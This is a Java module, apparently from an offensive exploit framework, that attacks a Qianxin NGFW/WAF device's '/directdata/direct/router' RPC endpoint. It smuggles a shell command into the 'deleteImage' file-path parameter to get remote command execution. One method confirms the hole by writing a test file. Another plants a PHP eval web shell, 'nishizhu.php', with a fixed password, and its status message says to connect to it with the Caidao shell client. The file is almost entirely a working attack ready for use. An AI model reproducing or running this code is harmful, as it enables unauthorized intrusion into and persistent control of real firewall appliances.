package Exp.equipment.qianxin;

import Utilss.HttpTools;
import Utilss.Response;
import Utilss.shell;
import core.Exploitlnterface;
import javafx.scene.control.TextArea;
import java.util.HashMap;

public class ngfw_waf_router implements Exploitlnterface{
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url, textArea, "nishizhu.txt", shell.Testpath);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Boolean att = shell(url,textArea);
        return att;
    }

    private  Boolean att(String url,TextArea textArea,String filename,String filepath){
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","application/x-www-form-urlencoded");
        String postString = "{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;echo '" + shell.readFile(filepath) +"' >/var/www/html/" + filename +  "\"]}],\"type\":\"rpc\",\"tid\":17}";
        Response post = HttpTools.post(url + "/directdata/direct/router", postString, head, "utf-8");
        if(post.getCode() == 200 && post.getText().contains("success")){
            Response response = HttpTools.get(url + "/" + filename, new HashMap<String, String>(), "utf-8");
            if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
                textArea.appendText("\n 漏洞存在，测试文件已写入 \n" + url + "/" + filename);
                return true;
            }else {
                textArea.appendText("\n NGFW_waf_router-RCE-漏洞不存在 (出现误报请联系作者)");
                return false;
            }
        }else {
            textArea.appendText("\n NGFW_waf_router-RCE-漏洞不存在 (出现误报请联系作者)");
            return false;
        }
    }

    private Boolean shell(String url,TextArea textArea){
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","application/x-www-form-urlencoded");
        String postString = "{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;echo '9df37afc77bdd582d90aefaf4e35c63e<?php @eval($_POST[nishizhu]);?>' > /var/www/html/nishizhu.php\"]}],\"type\":\"rpc\",\"tid\":17}";
        Response post = HttpTools.post(url + "/directdata/direct/router", postString, head, "utf-8");
        Response response = HttpTools.get(url + "/nishizhu.php", new HashMap<String, String>(),"utf-8");
        if(response.getCode() == 200 && response.getText().contains("9df37afc77bdd582d90aefaf4e35c63e")){
            textArea.appendText("\n shell写入成功 \n" + url + "/nishizhu.php");
            textArea.appendText("\n 请使用菜刀连接  密码为 nishizhu");
            return true;
        }else {
            textArea.appendText("\n 疑似查杀 请自行复现");
            return false;
        }
    }
}
